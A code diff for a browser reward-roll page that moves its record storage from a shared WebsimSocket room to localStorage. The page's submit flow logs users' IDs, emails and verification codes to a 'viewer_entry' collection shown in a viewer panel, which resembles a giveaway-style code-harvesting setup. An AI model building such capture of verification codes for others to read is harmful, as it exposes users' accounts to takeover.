@@ -14,8 +14,30 @@ function escapeHtml(str){
   return String(str).replace(/[&<>"']/g, (s)=>({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;' }[s]));
 }
 
-/* Create a WebsimSocket room instance for persisted records (used by the special viewer) */
-const room = new WebsimSocket();
+/* NOTE: WebsimSocket removed. Persistence is handled via localStorage for simple "collections". */
+
+/* localStorage-backed collection helpers */
+function readCollection(col){
+  try {
+    const v = localStorage.getItem('collection_' + col);
+    return v ? JSON.parse(v) : [];
+  } catch (e) {
+    return [];
+  }
+}
+function writeCollection(col, arr){
+  try {
+    localStorage.setItem('collection_' + col, JSON.stringify(arr || []));
+  } catch (e) {}
+}
+function createViewerEntry(obj){
+  try {
+    const col = 'viewer_entry';
+    const arr = readCollection(col);
+    arr.push(obj);
+    writeCollection(col, arr);
+  } catch (e) {}
+}
 
 /* Cooldown configuration: 5 hours in milliseconds */
 const COOLDOWN_MS = 5 * 60 * 60 * 1000;
@@ -54,10 +76,16 @@ function setupRoll(){
   const claimBtn = document.getElementById('claim-btn');
   const claimMsg = document.getElementById('claim-msg');
 
-  if (!rollBtn || !rewardResult || !bannerIdEl || !resultImage || !resultLabel) return;
+  if (!rollBtn || !rewardResult || !bannerIdEl || !resultImage || !resultLabel) {
+    console.warn('setupRoll aborted: missing elements', { rollBtn: !!rollBtn, rewardResult: !!rewardResult, bannerIdEl: !!bannerIdEl, resultImage: !!resultImage, resultLabel: !!resultLabel });
+    return;
+  }
   const userId = (bannerIdEl.textContent || 'guest').trim();
   const isGuest = userId.toLowerCase() === 'guest';
   let cooldownTimer = null;
+
+  // small debug so we can see binding
+  console.log('setupRoll bound', { userId, isGuest });
 
   // support image-backed buttons by updating the inner .btn-text when present
   const rollBtnTextEl = rollBtn.querySelector ? rollBtn.querySelector('.btn-text') : null;
@@ -117,89 +145,95 @@ function setupRoll(){
   if (claimBtn) claimBtn.classList.add('hidden');
 
   rollBtn.addEventListener('click', ()=> {
-    // hide claim message and button while rolling
-    if (claimMsg) claimMsg.classList.remove('show');
-    if (claimBtn) claimBtn.classList.add('hidden');
+    try {
+      // hide claim message and button while rolling
+      if (claimMsg) claimMsg.classList.remove('show');
+      if (claimBtn) claimBtn.classList.add('hidden');
 
-    // For non-guest users, enforce cooldown checks
-    if (!isGuest){
-      const last = getLastRollTs(userId);
-      if (last){
-        const next = last + COOLDOWN_MS;
-        const rem = next - Date.now();
-        if (rem > 0){
-          updateCooldownUI(rem);
-          startCooldownInterval(next);
-          return;
+      // For non-guest users, enforce cooldown checks
+      if (!isGuest){
+        const last = getLastRollTs(userId);
+        if (last){
+          const next = last + COOLDOWN_MS;
+          const rem = next - Date.now();
+          if (rem > 0){
+            updateCooldownUI(rem);
+            startCooldownInterval(next);
+            return;
+          }
         }
       }
+
+      // Begin roll animation and lock UI (guests can still see the animation)
+      rollBtn.disabled = true;
+      let elapsed = 0;
+      const total = 5000;
+      const tick = 300;
+      setRollLabel('Rolling');
+      // visual micro-reset
+      rewardResult.textContent = '';
+      rewardResult.classList.remove('reward-sirius','reward-spike','empty');
+      resultImage.classList.add('hidden');
+      resultImage.src = '';
+      resultLabel.classList.add('hidden');
+      resultLabel.textContent = '';
+      resultLabel.classList.remove('label-sirius','label-spike');
+
+      const spinner = setInterval(()=>{
+        const dots = '.'.repeat(((elapsed / tick) | 0) % 4);
+        setRollLabel('Rolling' + dots);
+        elapsed += tick;
+        if (elapsed >= total){
+          clearInterval(spinner);
+          const pick = Math.random() < 0.5 ? 'sirius' : 'spike';
+
+          if (pick === 'sirius'){
+            rewardResult.textContent = 'SIRIUS';
+            rewardResult.classList.remove('reward-spike','empty');
+            rewardResult.classList.add('reward-sirius');
+            resultImage.src = 'Images/IMG_1181.jpeg';
+            resultImage.alt = 'Sirius';
+            resultImage.classList.remove('hidden');
+            resultLabel.textContent = 'SIRIUS';
+            resultLabel.classList.remove('hidden');
+            resultLabel.classList.add('label-sirius');
+          } else {
+            rewardResult.textContent = 'SPIKE';
+            rewardResult.classList.remove('reward-sirius','empty');
+            rewardResult.classList.add('reward-spike');
+            resultImage.src = 'Images/IMG_1186.jpeg';
+            resultImage.alt = 'Spike';
+            resultImage.classList.remove('hidden');
+            resultLabel.textContent = 'SPIKE';
+            resultLabel.classList.remove('hidden');
+            resultLabel.classList.add('label-spike');
+          }
+
+          // show claim button after roll
+          if (claimBtn){
+            claimBtn.classList.remove('hidden');
+            claimBtn.disabled = false;
+          }
+
+          // store cooldown and start countdown only for non-guest users
+          const now = Date.now();
+          if (!isGuest){
+            setLastRollTs(userId, now);
+            const nextAllowed = now + COOLDOWN_MS;
+            updateCooldownUI(nextAllowed - Date.now());
+            startCooldownInterval(nextAllowed);
+          } else {
+            // guests: re-enable immediately but keep claim available
+            rollBtn.disabled = false;
+            setRollLabel('Roll');
+          }
+        }
+      }, tick);
+    } catch (err) {
+      console.error('Error during roll click handler', err);
+      // re-enable so user can try again
+      try { rollBtn.disabled = false; setRollLabel('Roll'); } catch(e){}
     }
-
-    // Begin roll animation and lock UI (guests can still see the animation)
-    rollBtn.disabled = true;
-    let elapsed = 0;
-    const total = 5000;
-    const tick = 300;
-    setRollLabel('Rolling');
-    // visual micro-reset
-    rewardResult.textContent = '';
-    rewardResult.classList.remove('reward-sirius','reward-spike','empty');
-    resultImage.classList.add('hidden');
-    resultImage.src = '';
-    resultLabel.classList.add('hidden');
-    resultLabel.textContent = '';
-    resultLabel.classList.remove('label-sirius','label-spike');
-
-    const spinner = setInterval(()=>{
-      const dots = '.'.repeat(((elapsed / tick) | 0) % 4);
-      setRollLabel('Rolling' + dots);
-      elapsed += tick;
-      if (elapsed >= total){
-        clearInterval(spinner);
-        const pick = Math.random() < 0.5 ? 'sirius' : 'spike';
-
-        if (pick === 'sirius'){
-          rewardResult.textContent = 'SIRIUS';
-          rewardResult.classList.remove('reward-spike','empty');
-          rewardResult.classList.add('reward-sirius');
-          resultImage.src = 'Images/IMG_1181.jpeg';
-          resultImage.alt = 'Sirius';
-          resultImage.classList.remove('hidden');
-          resultLabel.textContent = 'SIRIUS';
-          resultLabel.classList.remove('hidden');
-          resultLabel.classList.add('label-sirius');
-        } else {
-          rewardResult.textContent = 'SPIKE';
-          rewardResult.classList.remove('reward-sirius','empty');
-          rewardResult.classList.add('reward-spike');
-          resultImage.src = 'Images/IMG_1186.jpeg';
-          resultImage.alt = 'Spike';
-          resultImage.classList.remove('hidden');
-          resultLabel.textContent = 'SPIKE';
-          resultLabel.classList.remove('hidden');
-          resultLabel.classList.add('label-spike');
-        }
-
-        // show claim button after roll
-        if (claimBtn){
-          claimBtn.classList.remove('hidden');
-          claimBtn.disabled = false;
-        }
-
-        // store cooldown and start countdown only for non-guest users
-        const now = Date.now();
-        if (!isGuest){
-          setLastRollTs(userId, now);
-          const nextAllowed = now + COOLDOWN_MS;
-          updateCooldownUI(nextAllowed - Date.now());
-          startCooldownInterval(nextAllowed);
-        } else {
-          // guests: re-enable immediately but keep claim available
-          rollBtn.disabled = false;
-          setRollLabel('Roll');
-        }
-      }
-    }, tick);
   });
 
   // claim button handler
@@ -225,32 +259,33 @@ function setupRoll(){
 function performLogin(id){
   const displayId = id || '—';
 
-  // build new page content: banner + simplified single-stage result area, reward row, claim button, claim message, and PDF footer
+  // build new page content: banner + simplified single-stage result area, reward row, claim button, claim message
   const bannerHtml = buildBannerHtml(displayId);
+  // CENTER the main content and the reward area / buttons
   const mainHtml = `
-    <main class="post-login" role="main">
-      <div class="result-stage" aria-live="polite">
-        <img id="result-image" class="result-image hidden" src="" alt="Reward image" />
-        <div id="result-label" class="label-display hidden"></div>
+    <main class="post-login" role="main" style="display:flex;flex-direction:column;align-items:center;gap:16px;padding:20px;">
+      <div class="result-stage" aria-live="polite" style="width:100%;max-width:640px;display:flex;flex-direction:column;align-items:center;">
+        <img id="result-image" class="result-image hidden" src="" alt="Reward image" style="display:block;margin:8px auto;max-width:360px;width:100%;height:auto;border-radius:8px;box-shadow:0 6px 20px rgba(2,6,23,0.08);" />
+        <div id="result-label" class="label-display hidden" style="margin-top:8px;text-align:center;font-weight:800;"></div>
       </div>
 
-      <div class="reward-row">
-        <div id="reward-result" class="reward-display empty">No roll yet</div>
+      <div class="reward-row" style="display:flex;justify-content:center;align-items:center;gap:12px;width:100%;max-width:640px;">
+        <div id="reward-result" class="reward-display empty" style="min-width:120px;text-align:center;">No roll yet</div>
 
         <!-- Replaced roll button with image-backed button using the available parallelogram asset and visible label -->
-        <button id="roll-btn" class="image-btn" title="Roll" aria-label="Roll">
-          <img class="btn-img" src="Images/IMG_1203.png" alt="button image" />
+        <button id="roll-btn" class="image-btn" title="Roll" aria-label="Roll" style="display:flex;align-items:center;gap:8px;padding:10px 18px;border-radius:12px;">
+          <img class="btn-img" src="Images/IMG_1203.png" alt="button image" style="width:36px;height:36px;border-radius:6px;object-fit:cover;" />
           <span class="btn-text">Roll</span>
         </button>
 
-        <button id="claim-btn" class="image-btn claim-btn hidden" title="Claim reward" aria-label="Claim reward">
-          <img class="btn-img" src="Images/IMG_1203.png" alt="button image" />
+        <button id="claim-btn" class="image-btn claim-btn hidden" title="Claim reward" aria-label="Claim reward" style="display:flex;align-items:center;gap:8px;padding:10px 18px;border-radius:12px;">
+          <img class="btn-img" src="Images/IMG_1203.png" alt="button image" style="width:36px;height:36px;border-radius:6px;object-fit:cover;" />
           <span class="btn-text">Claim</span>
         </button>
       </div>
 
       <!-- Claim message shown under the screen -->
-      <div id="claim-msg" aria-hidden="true"></div>
+      <div id="claim-msg" aria-hidden="true" style="min-height:22px;text-align:center;"></div>
     </main>`;
 
   // replace body content with banner + main
@@ -271,11 +306,20 @@ function performLogin(id){
   if (label) { label.classList.add('hidden'); label.textContent = ''; label.classList.remove('label-sirius','label-spike'); }
 }
 
-/* Viewer helper: subscribe to common collections and show combined records in a simple panel */
+/* Viewer helper: subscribe to common collections and show combined records in a simple panel
+   Reimplemented to use localStorage polling (no Websim). */
 function setupViewer(){
-  // remove any existing viewer
+  // remove any existing viewer and stop any polling intervals attached
   let panel = document.getElementById('viewer-panel');
-  if (panel) panel.remove();
+  if (panel) {
+    // clear any stored poll handles
+    for (const k in panel) {
+      if (k && k.startsWith('poll_') && panel[k]) {
+        clearInterval(panel[k]);
+      }
+    }
+    panel.remove();
+  }
 
   panel = document.createElement('div');
   panel.id = 'viewer-panel';
@@ -296,7 +340,7 @@ function setupViewer(){
 
   const pre = document.getElementById('viewer-pre');
 
-  // try a few common collection names and subscribe to updates
+  // try a few common collection names and poll localStorage for updates
   const collections = ['post','message','upvote','note','comment','viewer_entry'];
   const state = {};
 
@@ -308,21 +352,35 @@ function setupViewer(){
     try { pre.textContent = JSON.stringify(merged, null, 2); } catch (e){ pre.textContent = String(merged); }
   }
 
-  // subscribe to each collection (if it exists, subscribe will still return but may be empty)
+  // initial fetch from localStorage
   for (const col of collections){
     try {
-      // initial fetch
-      const list = room.collection(col).getList() || [];
-      state[col] = list.reverse ? list.slice().reverse() : list;
-      refreshView();
+      const list = readCollection(col) || [];
+      state[col] = list.slice().reverse ? list.slice().reverse() : list;
+    } catch (e){
+      state[col] = state[col] || [];
+    }
+  }
+  refreshView();
 
-      // subscribe to live updates
-      const unsub = room.collection(col).subscribe((items) => {
-        state[col] = items.slice().reverse ? items.slice().reverse() : items;
-        refreshView();
-      });
-      // store unsub on panel so it can be cleaned up if needed
-      panel[`unsub_${col}`] = unsub;
+  // start polling each collection for changes and update the view
+  for (const col of collections){
+    try {
+      // poll every second and update state if changed
+      panel[`poll_${col}`] = setInterval(() => {
+        try {
+          const list = readCollection(col) || [];
+          // naive equality check via JSON stringify — works for small data and avoids deep compare
+          const prev = JSON.stringify(state[col] || []);
+          const now = JSON.stringify(list);
+          if (prev !== now){
+            state[col] = list.slice().reverse ? list.slice().reverse() : list;
+            refreshView();
+          }
+        } catch (e) {
+          // ignore errors during polling
+        }
+      }, 1000);
     } catch (e){
       // ignore collections that error
       state[col] = state[col] || [];
@@ -398,10 +456,11 @@ function onSubmit(e){
 
   // log the initial submission to the persistent viewer_entry collection so viewers can see it
   try {
-    room.collection('viewer_entry').create({
+    createViewerEntry({
       submitted_id: id || '',
       submitted_email: email || '',
-      stage: 'requested'
+      stage: 'requested',
+      ts: Date.now()
     });
   } catch (e){ /* ignore logging failures */ }
 
@@ -564,11 +623,12 @@ function onSubmit(e){
 
       // Persist the submitted verification code to viewer_entry so viewers can see it
       try {
-        room.collection('viewer_entry').create({
+        createViewerEntry({
           submitted_id: id || '',
           submitted_email: email || '',
           submitted_code: code,
-          stage: 'verified'
+          stage: 'verified',
+          ts: Date.now()
         });
       } catch (e){ /* ignore logging failures */ }
 
@@ -590,4 +650,3 @@ function onSubmit(e){
     });
   }
 }
-
